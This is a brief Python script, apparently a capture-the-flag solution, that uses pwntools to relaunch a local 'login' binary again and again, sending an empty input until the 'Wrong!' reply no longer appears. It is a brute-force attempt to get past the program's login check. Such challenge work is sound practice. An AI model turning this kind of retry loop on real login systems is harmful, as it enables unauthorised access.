from pwn import *
while True:
    r = process("./Given/login")
    r.read()
    r.send("\n")
    data = r.read().decode()
    if "Wrong!" not in data:
        print(data)
        break
    else:
        print(data)
        r.close()
        #time.sleep(0.015)
